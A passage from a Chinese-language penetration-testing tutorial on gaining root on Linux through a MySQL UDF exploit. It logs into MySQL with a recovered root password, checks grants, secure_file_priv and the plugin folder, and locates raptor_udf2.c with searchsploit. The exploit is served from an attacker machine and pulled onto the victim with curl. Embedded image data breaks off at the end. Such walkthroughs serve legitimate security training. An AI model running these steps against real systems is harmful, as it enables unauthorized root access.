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" width="457" height="62" class="img_ev3q"></p>
<p>在这种情况下，它没有转储用户名，但从 &quot;db &quot;部分，我们可以推断出这是一个 DB 用户。我们还可以检查文件以确定，因为我们知道这就是之前在 webroot 目录中看到的 config.php 文件。</p>
<p>Amazing！ LinPEAS 确实是一头野兽！它找到了我们手动枚举的所有内容，包括 MySQL root 用户的密码。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="23登录-mysql-进一步枚举"><strong><div id="id2.3">2.3、登录 MySQL 进一步枚举</div></strong><a href="#23登录-mysql-进一步枚举" class="hash-link" aria-label="23登录-mysql-进一步枚举的直接链接" title="23登录-mysql-进一步枚举的直接链接">​</a></h4>
<p>现在我们已经找到了 MySQL root 用户的用户名和密码，我们应该登录 MySQL 并执行进一步的枚举。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql -u root -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>当提示输入密码时，我们输入 <strong>SuperS3cureP@ssw0rd</strong>，然后我们就可以访问 MySQL。当密码输入正确后，我们将看到 mysql&gt; 提示符。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536558-1870657384-bfd46bb86f9fa8f50dbb29bfaa3b5abe.png" width="654" height="256" class="img_ev3q"></p>
<p>由于我们是MySQL超级用户（root），因此我们应该拥有该帐户的完全访问权限；但是，我们可以使用以下命令确认这一点：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SHOW GRANTS;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536157-1012361915-82f482c8da7d5be04f4309bd1c0e8c5f.png" width="595" height="149" class="img_ev3q"></p>
<p>这证实我们拥有所有权限，这是我们作为 root 所期望的。不过，有时我们可能会遇到 MySQL 的非 root 账户凭据。在这种情况下，我们需要使用 SHOW GRANTS 来检查我们拥有哪些权限。我们也可能发现该账户不是 &quot;root&quot;，但仍然是超级用户。</p>
<p>我们还想知道 secure_file_priv 的位置。secure file priv 是 MySQL 中的一个设置，用于限制数据可以从哪里写入 MySQL。如果将其设置为我们没有写入权限的文件夹，那么一切都完了。我们可以使用以下命令检查：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SHOW VARIABLES LIKE &#x27;SECURE_FILE_PRIV&#x27;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183535995-1205538161-8364e6b92f0fe451f2fa622697c0e3be.png" width="386" height="130" class="img_ev3q"></p>
<p>幸运的是，我们可以看到这里是空白的，这说明我们可以从系统中的任何文件位置写入 MySQL。</p>
<p>最后，在这里我们还可以获取<strong>插件</strong>文件夹的位置。后面当我们制作漏洞并将其加载到 MySQL 时，这将非常重要。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SHOW VARIABLES LIKE &#x27;PLUGIN_DIR&#x27;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536058-658359805-ebdee9812a0968c359f60974b18d51da.png" width="367" height="131" class="img_ev3q"></p>
<p>插件文件夹是默认共享对象所在的位置，也是唯一可以从中加载共享对象的文件夹。该文件夹由 root 拥有，但由于MySQL进程以 root 身份运行，所以当我们在 MySQL 内执行命令来移动我们的漏洞利用文件时，这些操作将以 root 身份在实际文件系统上执行，这将允许我们将文件移动到归 root 所属的文件夹。</p>
<p>上面我们已经彻底枚举了 MySQL，现在我们可以进入攻击的下一个阶段。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3定位下载和编译-udf-漏洞"><strong><div id="id3">3、定位、下载和编译 UDF 漏洞</div></strong><a href="#3定位下载和编译-udf-漏洞" class="hash-link" aria-label="3定位下载和编译-udf-漏洞的直接链接" title="3定位下载和编译-udf-漏洞的直接链接">​</a></h2>
<p>在此示例中，我们将使用 <strong>raptor_udf2.c</strong> UDF 漏洞利用，可以通过搜索 <a href="https://www.exploit-db.com/exploits/1518" target="_blank" rel="noopener noreferrer">exploit-db</a> 或 <a href="https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c" target="_blank" rel="noopener noreferrer">GitHub</a> 找到该漏洞。幸运的是，由于这个漏洞利用在exploit-db上，如果我们使用Kali，那么这个漏洞就已经在我们的系统上。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31下载-raptor_udf2c-副本"><strong><div id="id3.1">3.1、下载 raptor_udf2.c 副本</div></strong><a href="#31下载-raptor_udf2c-副本" class="hash-link" aria-label="31下载-raptor_udf2c-副本的直接链接" title="31下载-raptor_udf2c-副本的直接链接">​</a></h4>
<p>为了定位 UDF 漏洞，我们可以使用名为 searchsploit 的工具，其语法如下：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit udf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183538467-691665083-4d8cc0940fe2d0f8de834873422dce4a.png" width="1024" height="312" class="img_ev3q"></p>
<p>在这里我们看到有两个 UDF 漏洞利用彼此相似。然而，较新的版本包括 MySQL 版本 5.x，也是我们将在此处使用的版本（1518.c）。</p>
<p>接下来，我们希望将其复制到我们的工作目录中，以便我们可以在将其传输到受害者之前仔细查看。</p>
<p>要将漏洞利用程序复制或镜像到我们当前的工作目录中，我们可以将 <strong>-m</strong> 开关与 searchsploit 一起使用，如下所示：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit -m 1518.c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536553-1596154844-a4e2abb4d32bbfb4411c038a49d1001e.png" width="681" height="242" class="img_ev3q"></p>
<p>为了真实性，我们将这个漏洞重命名为 raptor_udf2.c，然后使用 head 命令查看注释。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mv 1518.c raptor_udf2.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">head -50 raptor_udf2.c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183537329-1902836325-2f33260c1d0d8300fafdb0549bf6b4fe.png" width="673" height="854" class="img_ev3q"></p>
<p>第一条注释说明提到，当 MySQL 以 root 身份运行时，此漏洞可用于通过 MySQL 进行本地权限升级，我们已经发现受害者就是这种情况。</p>
<p>接下来，它会告诉我们如何编译和使用漏洞利用程序。我们需要针对当前机器对命令做一些修改。</p>
<p>现在我们已经找到了要使用的漏洞，我们需要将其下载到受害者上。</p>
<p>在攻击者机器上，我们可以使用以下命令在工作目录的端口 80 上设置 HTTP 服务器：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m http.server 80</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536289-614998242-0be7402705ce9c1880d65d0dc8b5bdc8.png" width="470" height="117" class="img_ev3q"></p>
<p>回到受害者，我们可以使用 <strong>cURL</strong> 或 <strong>wget</strong> 从攻击者计算机下载文件。在此示例中，我们将使用 cURL。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/raptor_udf2.c -o raptor_udf2.c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183538504-110918539-c5d57a5caa23985080d70e45bb5f0bb9.png" width="1024" height="248" class="img_ev3q"></p>
<p>Perfect！我们现在已经找到了我们的漏洞并将其下载到受害者身上。接下来我们需要编译它。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32编译-raptor_udf2c-副本"><strong><div id="id3.2">3.2、编译 raptor_udf2.c 副本</div></strong><a href="#32编译-raptor_udf2c-副本" class="hash-link" aria-label="32编译-raptor_udf2c-副本的直接链接" title="32编译-raptor_udf2c-副本的直接链接">​</a></h4>
<p>编译前首先需要检查编译环境。有几种方法可以检查受害者是否安装了gcc 。</p>
<p>首先，我们可以尝试运行 gcc 并看看它说了什么。它要么会说需要安装，要么会告诉您如何正确使用该命令。不管怎样，这都会告诉我们 gcc 是否在系统上。至少，它告诉我们 gcc 是否在我们的 PATH 中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gcc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUIAAAA/CAIAAAAaBFZgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAASdEVYdFNvZnR3YXJlAEdyZWVuc2hvdF5VCAUAAB36SURBVHhe7Z15XBPH+8e/f3u0WlABgQhKQBQrgmBEBQ+sHHKogIAi4o0XCvUo1gsUQUVURA4FBOQy4gEISbjvEDYHgVyotfVr69VqtWqFP36/2ewGwmY3JNavCt15vV+8wjOTmSez89mZ3Z0n+U9ZWdl/yEQmMg3adPXqVfQVmchEpkGfuqT8gRGVtXp6MGwDmukQ/K8wv3HeUsbMVQ3xV6CITSxbd8asMKiF1yVp5oX6MmYG1GyJbAyLbr2Y38GWlyeyd9xpXe7NsPWuXBvFPnaqZdv2mt05YjEoXytMPlpt586wW9+UeEVQ1Yq6AWXUzQJt7YI4vC7elXr4NWiXK0rYxgQ+OIe1nDjTvDYIfk0L5VRxCf2Ea4OEh9YwbJYyl2xvDNtXtzmxo7ONHwacXNWUV8HbEcCw9WnMY/O2LWO6xQobMhtc1tTujGoOD6+as5Rh61V1tFgGKhma/SBvApfWrAYn8PGXV6073LQhBK5n/j5uKw/1B/i/MYa9awtsd9zDZfMI28X3n9gfdf7zuwTpG6hff20WlM3vdRWS3ZgujvpKcj1fYVHKKqSKo4aL4x0k2e6SjAiZmCPL0